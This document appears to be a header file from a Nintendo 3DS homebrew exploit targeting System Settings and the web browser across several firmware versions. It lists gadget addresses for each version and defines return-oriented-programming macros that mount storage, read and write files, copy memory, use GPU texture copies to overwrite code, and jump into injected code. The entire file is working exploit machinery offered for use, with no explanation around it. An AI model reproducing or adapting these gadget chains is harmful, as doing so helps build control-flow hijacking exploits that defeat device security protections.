#define DLPLAY_CODE_LOC_VA		0x00192800
#define DLPLAY_NSSHANDLE_LOC_VA		0x001A5200
#define KPROCESS_HANDLE			0xFFFF8001
#define GX_SetTextureCopy		0x00000004
#define THIS				0x08F10000
#define THIS_V3				0x0978CC00
#define FILE_READ			0x00000001
#define FILE_WRITE			0x00000002
#define FILE_CREATE			0x00000004
#define GARBAGE				0xDEADC0DE

#if defined(MSET_4) || defined(MSET_4_DG)
	#define ROP_LOC				0x002B0000
	#define	HANDLE_PTR			0x0027FAC4
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0013C5D4
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x0027C580
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x001AC924
	#define LDR_R0_0_POP_R4_PC		0x0012FBBC
	#define POP_PC				0x001002F9
	#define	POP_R0_PC			0x00143D8C
	#define POP_R1_PC			0x001C4FC4
//	#define POP_R1_PC			0x001549E1
	#define POP_R2_PC			0x0022952D
	#define POP_R3_PC			0x0010538C
	#define POP_R4_PC			0x001001ED
//	#define POP_R4_PC			0x001B3AA0
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0018D5DC
	#define POP_R4_LR_BX_R2			0x001D9360
	#define STR_R1_0_POP_R4_PC		0x0010CCBC
	#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x001B82AC
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001B3958
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001B3B54
	#define SVC_0A_BX_LR			0x001AEA50
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x001BFA64
	#if defined(MSET_4)
		#define CODE_TARGET			0x17FAD000
	#else
		#define CODE_TARGET			0x17EB0000
	#endif
#elif defined(MSET_6)
	#define ROP_LOC				0x00290000
	#define	HANDLE_PTR			0x0028DBEC
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0013D3FC
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x0028A580
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x001B4E8C
	#define LDR_R0_0_POP_R4_PC		0x00130818
	#define POP_PC				0x001002F9
	#define	POP_R0_PC			0x00144CF8
	#define POP_R1_2_3_PC			0x0011BE4D
	#define POP_R1_PC			0x001CD804
	#define POP_R3_PC			0x00105110
	#define POP_R4_PC			0x001001ED
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0018B184
	#define POP_R4_LR_BX_R2			0x00192758
	#define STR_R1_0_POP_R4_PC		0x0010CF5C
	#define SVC_0A_BX_LR			0x001B6C6C
	#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x001C08B8
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001BC18C
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x001BC384
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x001C8150
	#define CODE_TARGET			0x17EA0000
#elif defined(SPIDER_4) //1.7495JP/US/EU
	#define DLPLAY_CODE_LOC			(DLPLAY_CODE_LOC_VA-0x00100000+0x03F50000+0x14000000-0x4000)
	#define DLPLAY_HOOK_LOC			(0x1A3500-0x00100000+0x03F50000+0x14000000-0x4000)
	#define SPIDER_GSPHEAPBUF		0x18410000
	#define ROP_LOC			0x08B47400
	#define	HANDLE_PTR			0x003B643C
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x00344C2C
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003F54E8
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC	0x002CF3EC
	#define CALL_BX_LR			0x0025DFF0
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x0018114C
	#define LDR_R0_0_POP_R4_PC		0x001CCC64
	#define POP_LR_PC			0x002D6A34
	#define POP_PC				0x0010DB6C
	#define	POP_R0_PC			0x002AD574
	#define POP_R0_1_2_3_4_PC		0x0029C170
//	#define POP_R0_1_2_3_4_PC		0x0022B550
	#define POP_R0_1_2_3_4_7_PC		0x0017943B
	#define POP_R1_PC			0x00269758
	#define	POP_R2_PC			0x0012F815
	#define POP_R2_3_4_PC			0x00101878
	#define POP_R3_PC			0x0011B064
	#define POP_R4_PC			0x0010DAA8
	#define POP_R4_5_6_PC			0x00100D24
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00103DA8
	#define POP_R4_LR_BX_R2			0x00100C8C
	#define SP_LR_LDMFD_SP_LR_PC		0x002D6A30
	#define STR_R1_0_POP_R4_PC		0x0016F3FC
	#define SVC_0A_BX_LR			0x002A513C
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x00332BEC
	#define IFile_Open_LDMFD_SP_R4_5_6_7_PC	0x0025B0A8
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x002FC8E8
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00311D94
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x0029BF64
	#define DMC				0x002A5F27
	#define CODE_TARGET			0x192D3000
	#define MAGIC				0x002D6A1C
#elif defined(SPIDER_4_CN) //1.7538CN ???
	#warning ROP version not supported
#elif defined(SPIDER_4_KR) //1.7538KR
	#warning ROP version not supported
#elif defined(SPIDER_4_TW) //1.7538TW
	#warning ROP version not supported
#elif defined(SPIDER_5) //1.7552JP/US/EU
	#define DLPLAY_CODE_LOC			(DLPLAY_CODE_LOC_VA-0x00100000+0x03F50000+0x14000000)
	#define DLPLAY_HOOK_LOC			(0x1A3500-0x00100000+0x03F50000+0x14000000)
	#define SPIDER_GSPHEAPBUF		0x18410000
	#define ROP_LOC				0x088B5400
	#define	HANDLE_PTR			0x003DA72C
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012C228
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BF4C
	#define CALL_BX_LR			0x0023FFEC
	#define LDR_R0_0_POP_R4_PC		0x0011BB00
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5AC0
	#define POP_LR_PC			0x001303A4
	#define POP_PC				0x001057E0
	#define	POP_R0_PC			0x0010C320
	#define POP_R0_1_2_3_4_PC		0x0012A3D4
	#define POP_R0_1_2_3_4_7_PC		0x001946E3
	#define POP_R1_PC			0x00228B10
	#define	POP_R3_PC			0x00105100
	#define POP_R2_3_4_PC			0x001007B4
	#define POP_R4_PC			0x0010510C
	#define POP_R4_5_6_PC			0x0010014C
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065C4
//	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0010CC4C
	#define SP_LR_LDMFD_SP_LR_PC		0x001303A0
	#define STR_R1_0_POP_R4_PC		0x001066B0
	#define SVC_0A_BX_LR			0x0010420C
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA2C
	#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FE48
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001686C4
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x0016874C
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x00240B5C
	#define DMC				0x001050CB
	#define CODE_TARGET			0x19592000
	#define MAGIC				0x0013038C
#elif defined(SPIDER_5_CN) //1.7552CN
	#warning ROP version not supported
#elif defined(SPIDER_5_KR) //1.7552KR
	#warning ROP version not supported
#elif defined(SPIDER_5_TW) //1.7552TW
	#warning ROP version not supported
#elif defined(SPIDER_9) //1.7567JP/US/EU
	#define DLPLAY_CODE_LOC			(DLPLAY_CODE_LOC_VA-0x00100000+0x03F50000+0x14000000)
	#define DLPLAY_HOOK_LOC			(0x03FF3500+0x14000000)
	#define SPIDER_GSPHEAPBUF		0x18370000
	#define ROP_LOC			0x08B88400
//	#define ROP_LOC			0x08CF2000 //GW3?
	#define	HANDLE_PTR			0x003DA72C
	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012C1E0
	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC	0x0012BF04
	#define CALL_BX_LR			0x0023FFE8
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5AE0
	#define LDR_R0_0_POP_R4_PC		0x0011BACC
	#define POP_LR_PC			0x0013035C
	#define POP_PC				0x001057C4
	#define POP_R0_1_2_3_4_PC		0x0010B5B4
	#define POP_R0_1_2_3_4_7_PC		0x001946EB
	#define	POP_R0_PC			0x0010C2FC
	#define POP_R1_PC			0x00228AF4
	#define POP_R2_3_4_PC			0x001007B4
	#define POP_R3_PC			0x001050E8
	#define POP_R4_PC			0x001050F0
	#define POP_R4_5_6_PC			0x0010014C
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065A8
	#define SP_LR_LDMFD_SP_LR_PC		0x00130358
	#define STR_R1_0_POP_R4_PC		0x00106694
	#define SVC_0A_BX_LR			0x001041F8
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA34
	#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FE0C
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x001686E0
	#define IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC	0x00168768
	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x00240B54
	#define DMC				0x001050B3
	#define CODE_TARGET			0x19592000
	#define MAGIC				0x00130344
#elif defined(SPIDER_9_CN) //1.7567CN
	#warning ROP version not supported
#elif defined(SPIDER_9_KR) //1.7567KR
//	#define DLPLAY_CODE_LOC			
//	#define DLPLAY_HOOK_LOC			
//	#define SPIDER_GSPHEAPBUF		0x
	#define SPIDER_ROP_LOC			0x08CD0000
//	#define	HANDLE_PTR			0x003B643C
//	#define GSPGPU_FlushDataCache		0x00344C2C
//	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x
//	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue	0x
//	#define POP_R0_1_2_3_4_PC		0x0029C170
	#define	POP_R0_PC			0x0010C2FC
	#define POP_R1_PC			0x0022825C
//	#define POP_LR_PC			0x
	#define POP_PC				0x001057C4
	#define POP_R0_1_2_3_4_7_PC		0x0019473B
	#define POP_R4_5_6_PC			0x0010014C
	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065A8
	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA84
	#define IFile_Open_LDMFD_SP_R4_5_6_7_PC	0x0022FA90
	#define IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC	0x0016871C
//	#define MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR	0x
//	#define SVC_0A_BX_LR			0x
	#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5760
	#define SP_LR_LDMFD_SP_LR_PC		0x0012FE48
	#define CALL_BX_LR			0x0023FC6C
	#define DMC				0x001050B3
	#define CODE_TARGET			0x19255000
	#define MAGIC				0x0012FE34
#elif defined(SPIDER_9_TW) //1.7567TW
	#warning ROP version not supported
#else
	#error ROP version not defined
#endif
#if defined(SPIDER_4)
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC
	#define IFile_Open			IFile_Open_LDMFD_SP_R4_5_6_7_PC
#else
	#define nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC
	#define IFile_Open			IFile_Open_LDMFD_SP_R4_5_6_7_8_PC
#endif
#if defined(MSET_4) || defined(MSET_4_DG) || defined(MSET_6)
	#define CODE_ENTRY			0x00240000
	#define rop_fs_mount(drive)		.word POP_R0_PC, drive, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC, GARBAGE, GARBAGE, GARBAGE
	#define rop_file_open(handle, filename, mode)	.word POP_R0_1_2_3_4_PC, handle, ROP_LOC+filename, mode, GARBAGE, GARBAGE, IFile_Open, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC
	#define rop_flush_data_cache(handle, kprocess, buffer, size) .word POP_R0_1_2_3_4_PC, handle, kprocess, buffer, size, GARBAGE, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC, GARBAGE, GARBAGE, GARBAGE
	#if defined(MSET_6)
		#define rop_file_read(handle, readcount, buffer, size) .word POP_R0_1_2_3_4_PC, handle, readcount, buffer, size, GARBAGE, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
		#define rop_file_write(handle, writecount, buffer, size) .word POP_R0_1_2_3_4_PC, handle, writecount, buffer, size, GARBAGE, POP_R1_2_3_PC, GARBAGE, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, POP_PC, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
		#define rop_memcpy(dst,src,size) .word POP_R0_1_2_3_4_PC, dst, src, size, GARBAGE, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
		#define rop_sleep(ns) .word POP_R0_PC, ns, POP_R1_2_3_PC, 0, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, SVC_0A_BX_LR 
	#else
		#define rop_file_read(handle, readcount, buffer, size) .word POP_R0_1_2_3_4_PC, handle, readcount, buffer, size, GARBAGE, POP_R2, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
		#define rop_file_write(handle, writecount, buffer, size) .word POP_R0_1_2_3_4_PC, handle, writecount, buffer, size, GARBAGE, POP_R2, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
		#define rop_memcpy(dst,src,size) .word POP_R0_1_2_3_4_PC, dst, src, size, GARBAGE, GARBAGE, POP_R2, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
		#define rop_sleep(ns) .word POP_R0_PC, ns, POP_R1, 0, POP_R2, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, SVC_0A_BX_LR 
	#endif

#else //SPIDER
	#define CODE_ENTRY			0x009D2000
	#define rop_fs_mount(drive)		.word POP_R0_PC, drive, POP_LR_PC, POP_PC, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC
	#define rop_file_open(handle, filename, mode)	.word POP_R0_1_2_3_4_PC, handle, ROP_LOC+filename, mode, GARBAGE, GARBAGE, POP_LR_PC, POP_PC, IFile_Open
	#define rop_file_read(handle, readcount, buffer, size)	.word POP_R0_1_2_3_4_PC, handle, readcount, buffer, size, GARBAGE, POP_LR_PC, POP_PC, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
	#define rop_file_write(handle, writecount, buffer, size)	.word POP_R0_1_2_3_4_PC, handle, writecount, buffer, size, GARBAGE, POP_LR_PC, POP_PC, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
	#define rop_memcpy(dst,src,size)	.word POP_R0_1_2_3_4_PC, dst, src, size, GARBAGE, GARBAGE, POP_LR_PC, POP_PC, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
	#define rop_sleep(ns)			.word POP_R0_PC, ns, POP_R1_PC, 0, POP_LR_PC, POP_PC, SVC_0A_BX_LR 
	#define rop_flush_data_cache(handle, kprocess, buffer, size) .word POP_R0_1_2_3_4_PC, handle, kprocess, buffer, size, GARBAGE, POP_LR_PC, POP_PC, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC
#endif
/*
#define rop_fs_mount(drive) .word POP_R0_PC, drive, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC, GARBAGE, GARBAGE, GARBAGE
#define rop_file_open(handle, filename, mode) .word POP_R0_1_2_3_4_7_PC, handle, ROP_LOC+filename, mode, GARBAGE, GARBAGE, GARBAGE, IFile_Open, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC
#define rop_file_read(handle, readcount, buffer, size) .word POP_R0_1_2_3_4_7_PC, handle, readcount, buffer, size, GARBAGE, GARBAGE, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
#define rop_file_write(handle, writecount, buffer, size) .word POP_R0_1_2_3_4_7_PC, handle, writecount, buffer, size, GARBAGE, GARBAGE, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
#define rop_memcpy(dst,src,size) .word POP_R0_1_2_3_4_PC, dst, src, size, GARBAGE, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
#define rop_sleep(ns) .word POP_R0_PC, ns, POP_R1_PC, 0, POP_LR_PC, POP_PC, SVC_0A_BX_LR 
#define rop_flush_data_cache(handle, kprocess, buffer, size) .word POP_R0_1_2_3_4_PC, handle, kprocess, buffer, size, GARBAGE, POP_LR_PC, POP_PC, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC
#define rop_gx_command(command) .word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+command, POP_LR_PC, POP_PC, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
#define rop_gx_texture_copy(src, dst, size) .word GX_SetTextureCopy, src, dst, size, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0
*/
#define JOIN(a,b)	a##b
#define LABEL(a)	JOIN(loc_, a)
#define LINE_LABEL	LABEL(__LINE__)
#define rop_gx_texture_copy(src, dst, size)	LINE_LABEL:	.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+LINE_LABEL+0x14, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue, GX_SetTextureCopy, src, dst, size, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008
#define rop_jump(address)		.word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, address-4, SP_LR_LDMFD_SP_LR_PC
#define rop_jump_arm			.word CODE_ENTRY
